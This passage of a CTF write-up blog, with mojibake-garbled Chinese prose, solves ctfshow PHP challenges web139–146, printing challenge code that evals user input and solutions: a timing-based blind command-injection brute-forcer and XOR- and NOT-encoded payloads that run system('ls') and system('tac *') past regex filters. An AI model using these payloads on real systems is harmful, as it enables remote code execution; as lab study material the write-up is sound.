&#123;&#125; ];then sleep 3;fi"</span>result <span class="token operator">=</span> <span class="token string">"++++++++++++++++++"</span>row <span class="token operator">=</span> <span class="token number">7</span>length <span class="token operator">=</span> <span class="token number">48</span>strings <span class="token operator">=</span> <span class="token string">"qwertyuiopasdfghjklzxcvbnm_-0123456789"</span><span class="token comment">#ctfshow&#123;801ba0c2-5fad-4324-9be3-af824df7867a&#125;</span><span class="token keyword">for</span> r <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>row<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> c <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>length<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> s <span class="token keyword">in</span> strings<span class="token punctuation">:</span>            url1 <span class="token operator">=</span> url <span class="token operator">+</span> payload<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>r<span class="token punctuation">,</span> c<span class="token punctuation">,</span> s<span class="token punctuation">)</span>            <span class="token comment">#print(url1)</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url1<span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">2.5</span><span class="token punctuation">)</span>            <span class="token keyword">except</span><span class="token punctuation">:</span>                result <span class="token operator">+=</span>s                <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>                <span class="token keyword">break</span>        result <span class="token operator">+=</span> <span class="token string">" "</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ‹¿åˆ°flag</p><p><img src="/images/web_139c.png"></p><p>æœ€åå»æ‰ç©ºæ ¼å³å¯</p><h4 id="web140"><a href="#web140" class="headerlink" title="web140"></a>web140</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">&lt;</span>?phperror_reporting<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>highlight_file<span class="token punctuation">(</span>__FILE__<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>isset<span class="token punctuation">(</span>$_POST<span class="token punctuation">[</span><span class="token string">'f1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token operator">&amp;</span> isset<span class="token punctuation">(</span>$_POST<span class="token punctuation">[</span><span class="token string">'f2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    $f1 <span class="token operator">=</span> <span class="token punctuation">(</span>String<span class="token punctuation">)</span>$_POST<span class="token punctuation">[</span><span class="token string">'f1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    $f2 <span class="token operator">=</span> <span class="token punctuation">(</span>String<span class="token punctuation">)</span>$_POST<span class="token punctuation">[</span><span class="token string">'f2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>preg_match<span class="token punctuation">(</span><span class="token string">'/^[a-z0-9]+$/'</span><span class="token punctuation">,</span> $f1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>preg_match<span class="token punctuation">(</span><span class="token string">'/^[a-z0-9]+$/'</span><span class="token punctuation">,</span> $f2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            $code <span class="token operator">=</span> <span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token string">"return $f1($f2());"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>intval<span class="token punctuation">(</span>$code<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'ctfshow'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                echo file_get_contents<span class="token punctuation">(</span><span class="token string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¯ä»¥çœ‹å‡ºæœ€åçš„ifé‡Œé¢æ˜¯ä¸€ä¸ªå¼±æ¯”è¾ƒï¼Œå…ˆæŸ¥çœ‹ä¸€ä¸‹å¼±æ¯”è¾ƒè¡¨<br><img src="/images/web_140.png"></p><p>å¯ä»¥çœ‹åˆ°0åœ¨ä¸â€phpâ€æ¯”è¾ƒæ—¶ï¼Œä¸ºtrueï¼Œè€Œinvtalå‡½æ•°ä¼šå°†éæ•°å­—å­—ç¬¦è½¬æ¢ä¸º0ï¼Œæ‰€ä»¥payloadï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">postf1<span class="token operator">=</span>sha1<span class="token operator">&amp;</span>f2<span class="token operator">=</span>sha2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>æœ€åå³é”®æºä»£ç ï¼Œå³å¯æ‹¿åˆ°flag</p><h4 id="web141"><a href="#web141" class="headerlink" title="web141"></a>web141</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">&lt;</span>?phphighlight_file<span class="token punctuation">(</span>__FILE__<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>isset<span class="token punctuation">(</span>$_GET<span class="token punctuation">[</span><span class="token string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token operator">&amp;</span> isset<span class="token punctuation">(</span>$_GET<span class="token punctuation">[</span><span class="token string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token operator">&amp;</span> isset<span class="token punctuation">(</span>$_GET<span class="token punctuation">[</span><span class="token string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    $v1 <span class="token operator">=</span> <span class="token punctuation">(</span>String<span class="token punctuation">)</span>$_GET<span class="token punctuation">[</span><span class="token string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    $v2 <span class="token operator">=</span> <span class="token punctuation">(</span>String<span class="token punctuation">)</span>$_GET<span class="token punctuation">[</span><span class="token string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    $v3 <span class="token operator">=</span> <span class="token punctuation">(</span>String<span class="token punctuation">)</span>$_GET<span class="token punctuation">[</span><span class="token string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>is_numeric<span class="token punctuation">(</span>$v1<span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token operator">&amp;</span> is_numeric<span class="token punctuation">(</span>$v2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>preg_match<span class="token punctuation">(</span><span class="token string">'/^\W+$/'</span><span class="token punctuation">,</span> $v3<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            $code <span class="token operator">=</span>  <span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token string">"return $v1$v3$v2;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            echo <span class="token string">"$v1$v3$v2 = "</span><span class="token punctuation">.</span>$code<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åœ¨æœ¬é¢˜ä¸­v1v2å¿…é¡»ä¸ºæ•°å­—ï¼Œè€Œv3ä¸èƒ½æ˜¯å­—æ¯æ•°å­—ï¼Œæ‰€ä»¥å¯ä»¥è€ƒè™‘ç”¨å¼‚æˆ–å»æ„é€ v3,åŒæ—¶åœ¨æœ¬åœ°æµ‹è¯•ä¸€ä¸‹ï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">&lt;</span>?php<span class="token number">1</span><span class="token operator">-</span><span class="token punctuation">(</span><span class="token string">"phpinfo"</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/images/web_141a.png"></p><p>å‘ç°å¯ä»¥æˆåŠŸæ˜¾ç¤º</p><p>ç„¶åç°åœ¨éœ€è¦åšçš„æ˜¯é€šè¿‡å¼‚æˆ–å»æ„é€ ç›¸å…³çš„å‘½ä»¤å³å¯ï¼Œè¿™é‡Œæˆ‘ç›´æ¥ç”¨çš„æ˜¯å—ç¥åšå®¢é‡Œçš„è„šæœ¬å…ˆæ„é€ å‡ºï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token number">1</span><span class="token operator">-</span><span class="token punctuation">(</span><span class="token string">"system"</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">"ls"</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token number">1</span><span class="token operator">-</span><span class="token punctuation">(</span><span class="token string">"%08%02%08%08%05%0d"</span><span class="token operator">^</span><span class="token string">"%7b%7b%7b%7c%60%60"</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">"%0c%08"</span><span class="token operator">^</span><span class="token string">"%60%7b"</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span>å³ï¼š?v1<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>v2<span class="token operator">=</span><span class="token number">2</span><span class="token operator">&amp;</span>v3<span class="token operator">=</span><span class="token operator">-</span><span class="token punctuation">(</span><span class="token string">"%08%02%08%08%05%0d"</span><span class="token operator">^</span><span class="token string">"%7b%7b%7b%7c%60%60"</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">"%0c%08"</span><span class="token operator">^</span><span class="token string">"%60%7b"</span><span class="token punctuation">)</span><span class="token operator">-</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/images/web_141b.png"></p><p>å¯ä»¥çœ‹åˆ°å‡ºæ¥äº†ä¸€ä¸ªflag.phpï¼Œè¯»å–å®ƒå°±å¯ä»¥äº†</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token number">1</span><span class="token operator">-</span><span class="token punctuation">(</span><span class="token string">"system"</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">"tac *"</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span>?v1<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>v2<span class="token operator">=</span><span class="token number">2</span><span class="token operator">&amp;</span>v3<span class="token operator">=</span><span class="token operator">-</span><span class="token punctuation">(</span><span class="token string">"%08%02%08%08%05%0d"</span><span class="token operator">^</span><span class="token string">"%7b%7b%7b%7c%60%60"</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">"%08%01%03%00%06%00"</span><span class="token operator">^</span><span class="token string">"%7c%60%60%20%60%2a"</span><span class="token punctuation">)</span><span class="token operator">-</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>æ‹¿åˆ°flag</p><h4 id="web142"><a href="#web142" class="headerlink" title="web142"></a>web142</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">&lt;</span>?phperror_reporting<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>highlight_file<span class="token punctuation">(</span>__FILE__<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>isset<span class="token punctuation">(</span>$_GET<span class="token punctuation">[</span><span class="token string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    $v1 <span class="token operator">=</span> <span class="token punctuation">(</span>String<span class="token punctuation">)</span>$_GET<span class="token punctuation">[</span><span class="token string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>is_numeric<span class="token punctuation">(</span>$v1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        $d <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">)</span><span class="token punctuation">(</span>$v1 <span class="token operator">*</span> <span class="token number">0x36d</span> <span class="token operator">*</span> <span class="token number">0x36d</span> <span class="token operator">*</span> <span class="token number">0x36d</span> <span class="token operator">*</span> <span class="token number">0x36d</span> <span class="token operator">*</span> <span class="token number">0x36d</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        sleep<span class="token punctuation">(</span>$d<span class="token punctuation">)</span><span class="token punctuation">;</span>        echo file_get_contents<span class="token punctuation">(</span><span class="token string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¯¥é¢˜çš„æ„æ€è¾“å…¥ä¸€ä¸ªå­—ç¬¦ä¸²åï¼Œä¼šå»å’Œè¿™å‡ ä¸ª0X36dä¹˜åï¼Œå»¶è¿Ÿè¿™ä¹ˆä¹…çš„æ—¶é—´ï¼Œä½†å¦‚æœè¾“å…¥çš„æ˜¯0æˆ–è€…è´Ÿæ•°ï¼Œå°±ä¼šç«‹åˆ»è¾“å‡ºflagï¼Œpayloadï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">?v1<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å³é”®æŸ¥çœ‹æºä»£ç ï¼Œå°±å¯ä»¥çœ‹åˆ°flagäº†</p><h4 id="web143"><a href="#web143" class="headerlink" title="web143"></a>web143</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">&lt;</span>?phphighlight_file<span class="token punctuation">(</span>__FILE__<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>isset<span class="token punctuation">(</span>$_GET<span class="token punctuation">[</span><span class="token string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token operator">&amp;</span> isset<span class="token punctuation">(</span>$_GET<span class="token punctuation">[</span><span class="token string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token operator">&amp;</span> isset<span class="token punctuation">(</span>$_GET<span class="token punctuation">[</span><span class="token string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    $v1 <span class="token operator">=</span> <span class="token punctuation">(</span>String<span class="token punctuation">)</span>$_GET<span class="token punctuation">[</span><span class="token string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    $v2 <span class="token operator">=</span> <span class="token punctuation">(</span>String<span class="token punctuation">)</span>$_GET<span class="token punctuation">[</span><span class="token string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    $v3 <span class="token operator">=</span> <span class="token punctuation">(</span>String<span class="token punctuation">)</span>$_GET<span class="token punctuation">[</span><span class="token string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>is_numeric<span class="token punctuation">(</span>$v1<span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token operator">&amp;</span> is_numeric<span class="token punctuation">(</span>$v2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>preg_match<span class="token punctuation">(</span><span class="token string">'/[a-z]|[0-9]|\+|\-|\.|\_|\||\$|\&#123;|\&#125;|\~|\%|\&amp;|\;/i'</span><span class="token punctuation">,</span> $v3<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                die<span class="token punctuation">(</span><span class="token string">'get out hacker!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span><span class="token punctuation">&#123;</span>            $code <span class="token operator">=</span>  <span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token string">"return $v1$v3$v2;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            echo <span class="token string">"$v1$v3$v2 = "</span><span class="token punctuation">.</span>$code<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¯ä»¥çœ‹åˆ°åœ¨æ­¤é¢˜åœ¨141çš„åŸºç¡€banæ‰äº†æ›´å¤šçš„å­—ç¬¦ï¼Œä½†^å’Œ*æ²¡ban,æ‰€ä»¥æˆ‘ä»¬ç»§ç»­ä½¿ç”¨å¼‚æˆ–ï¼Œç»§ç»­ç”¨å—ç¥çš„è„šæœ¬è·‘å‡ºæ‰€éœ€è¦çš„å‘½ä»¤</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">?v1<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>v2<span class="token operator">=</span><span class="token number">2</span><span class="token operator">&amp;</span>v3<span class="token operator">=</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token string">"%0c%06%0c%0b%05%0d"</span><span class="token operator">^</span><span class="token string">"%7f%7f%7f%7f%60%60"</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">"%0b%01%03%00%06%00"</span><span class="token operator">^</span><span class="token string">"%7f%60%60%20%60%2a"</span><span class="token punctuation">)</span><span class="token operator">*</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ‹¿åˆ°flag</p><h4 id="web144"><a href="#web144" class="headerlink" title="web144"></a>web144</h4><pre class="line-numbers language-none"><code class="language-none">&lt;?phphighlight_file(__FILE__);if(isset($_GET[&#39;v1&#39;])Â &amp;&amp;Â isset($_GET[&#39;v2&#39;])Â &amp;&amp;Â isset($_GET[&#39;v3&#39;]))&#123;Â Â Â Â $v1Â &#x3D;Â (String)$_GET[&#39;v1&#39;];Â Â Â Â $v2Â &#x3D;Â (String)$_GET[&#39;v2&#39;];Â Â Â Â $v3Â &#x3D;Â (String)$_GET[&#39;v3&#39;];Â Â Â Â if(is_numeric($v1)Â &amp;&amp;Â check($v3))&#123;Â Â Â Â Â Â Â Â if(preg_match(&#39;&#x2F;^\W+$&#x2F;&#39;,Â $v2))&#123;Â Â Â Â Â Â Â Â Â Â Â Â $codeÂ &#x3D;Â Â eval(&quot;returnÂ $v1$v3$v2;&quot;);Â Â Â Â Â Â Â Â Â Â Â Â echoÂ &quot;$v1$v3$v2Â &#x3D;Â &quot;.$code;Â Â Â Â Â Â Â Â &#125;Â Â Â Â &#125;&#125;functionÂ check($str)&#123;Â Â Â Â returnÂ strlen($str)&#x3D;&#x3D;&#x3D;1?true:false;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™é¢˜åœ¨143çš„åŸºç¡€ä¸Šä¿®æ”¹äº†ä¸€ä¸‹ï¼Œv1ä¾æ—§å¿…é¡»æ˜¯å­—ç¬¦ä¸²ï¼Œv2ä¸èƒ½æ˜¯å­—æ¯æ•°å­—ä¸‹åˆ’çº¿ï¼Œv3çš„é•¿åº¦å¿…é¡»ä¸º1</p><p>æ‰€ä»¥æˆ‘ä»¬ä¾æ—§å¯ä»¥é‡æ–°æ„é€ å“ˆå³å¯</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">?v1<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>v2<span class="token operator">=</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token string">"%08%02%08%08%05%0d"</span><span class="token operator">^</span><span class="token string">"%7b%7b%7b%7c%60%60"</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">"%08%01%03%00%06%00"</span><span class="token operator">^</span><span class="token string">"%7c%60%60%20%60%2a"</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v3<span class="token operator">=</span><span class="token operator">*</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ‹¿åˆ°flag</p><h4 id="web145"><a href="#web145" class="headerlink" title="web145"></a>web145</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">&lt;</span>?phphighlight_file<span class="token punctuation">(</span>__FILE__<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>isset<span class="token punctuation">(</span>$_GET<span class="token punctuation">[</span><span class="token string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token operator">&amp;</span> isset<span class="token punctuation">(</span>$_GET<span class="token punctuation">[</span><span class="token string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token operator">&amp;</span> isset<span class="token punctuation">(</span>$_GET<span class="token punctuation">[</span><span class="token string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    $v1 <span class="token operator">=</span> <span class="token punctuation">(</span>String<span class="token punctuation">)</span>$_GET<span class="token punctuation">[</span><span class="token string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    $v2 <span class="token operator">=</span> <span class="token punctuation">(</span>String<span class="token punctuation">)</span>$_GET<span class="token punctuation">[</span><span class="token string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    $v3 <span class="token operator">=</span> <span class="token punctuation">(</span>String<span class="token punctuation">)</span>$_GET<span class="token punctuation">[</span><span class="token string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>is_numeric<span class="token punctuation">(</span>$v1<span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token operator">&amp;</span> is_numeric<span class="token punctuation">(</span>$v2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>preg_match<span class="token punctuation">(</span><span class="token string">'/[a-z]|[0-9]|\@|\!|\+|\-|\.|\_|\$|\&#125;|\%|\&amp;|\;|\&lt;|\>|\*|\/|\^|\#|\"/i'</span><span class="token punctuation">,</span> $v3<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                die<span class="token punctuation">(</span><span class="token string">'get out hacker!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span><span class="token punctuation">&#123;</span>            $code <span class="token operator">=</span>  <span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token string">"return $v1$v3$v2;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            echo <span class="token string">"$v1$v3$v2 = "</span><span class="token punctuation">.</span>$code<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™ä¸€æ¬¡å°†å¼‚æˆ–ç¬¦å·ç»™banäº†ï¼Œä½†è¿˜æœ‰å–å~åœ¨å¤–é¢ï¼Œè¿™ä¸€æ¬¡è‡ªå·±æ‰‹ç®—äº†ä¸€ä¸‹<br><img src="/images/web_145.png"></p><p>payloadï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">?v1<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>v2<span class="token operator">=</span><span class="token number">2</span><span class="token operator">&amp;</span>v3<span class="token operator">=</span>?<span class="token punctuation">(</span><span class="token operator">~</span><span class="token operator">%</span>8c<span class="token operator">%</span><span class="token number">86</span><span class="token operator">%</span>8c<span class="token operator">%</span>8b<span class="token operator">%</span>9a<span class="token operator">%</span><span class="token number">92</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token operator">%</span>8b<span class="token operator">%</span>9e<span class="token operator">%</span>9c<span class="token operator">%</span>df<span class="token operator">%</span><span class="token number">99</span><span class="token operator">%</span>d5<span class="token punctuation">)</span><span class="token punctuation">:</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ‹¿åˆ°flag</p><h4 id="web146"><a href="#web146" class="headerlink" title="web146"></a>web146</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">&lt;</span>?phphighlight_file<span class="token punctuation">(</span>__FILE__<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>isset<span class="token punctuation">(</span>$_GET<span class="token punctuation">[</span><span class="token string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token operator">&amp;</span> isset<span class="token punctuation">(</span>$_GET<span class="token punctuation">[</span><span class="token string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token operator">&amp;</span> isset<span class="token punctuation">(</span>$_GET<span class="token punctuation">[</span><span class="token string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    $v1 <span class="token operator">=</span> <span class="token punctuation">(</span>String<span class="token punctuation">)</span>$_GET<span class="token punctuation">[</span><span class="token string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    $v2 <span class="token operator">=</span> <span class="token punctuation">(</span>String<span class="token punctuation">)</span>$_GET<span class="token punctuation">[</span><span class="token string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    $v3 <span class="token operator">=</span> <span class="token punctuation">(</span>String<span class="token punctuation">)</span>$_GET<span class="token punctuation">[</span><span class="token string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>is_numeric<span class="token punctuation">(</span>$v1<span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token operator">&amp;</span> is_numeric<span class="token punctuation">(</span>$v2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>preg_match<span class="token punctuation">(</span><span class="token string">'/[a-z]|[0-9]|\@|\!|\:|\+|\-|\.|\_|\$|\&#125;|\%|\&amp;|\;|\&lt;|\>|\*|\/|\^|\#|\"/i'</span><span class="token punctuation">,</span> $v3<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                die<span class="token punctuation">(</span><span class="token string">'get out hacker!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span><span class="token punctuation">&#123;</span>            $code <span class="token operator">=</span>  <span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token string">"return $v1$v3$v2;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            echo <span class="token string">"$v1$v3$v2 = "</span><span class="token punctuation">.</span>$code<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™é¢˜åˆåœ¨åŸæ¥çš„åŸºç¡€ä¸Šå¤šbanäº†ä¸€äº›ä¸œè¥¿ï¼Œä½†å–åä¾æ—§æ²¡banï¼ŒåŒæ—¶å¯ä»¥å‘ç°|ä¹Ÿæ²¡æœ‰banï¼Œæ‰€ä»¥payloadï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">?v1<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>v2<span class="token operator">=</span><span class="token number">2</span><span class="token operator">&amp;</span>v3<span class="token operator">=</span><span class="token operator">|</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token operator">%</span>8c<span class="token operator">%</span><span class="token number">86</span><span class="token operator">%</span>8c<span class="token operator">%</span>8b<span class="token operator">%</span>9a<span class="token operator">%</span><span class="token number">92</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token operator">%</span>8b<span class="token operator">%</span>9e<span class="token operator">%</span>9c<span class="token operator">%</span>df<span class="token operator">%</span><span class="token number">99</span><span class="token operator">%</span>d5<span class="token punctuation">)</span><span class="token operator">|</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ‹¿åˆ°flag</p><h4 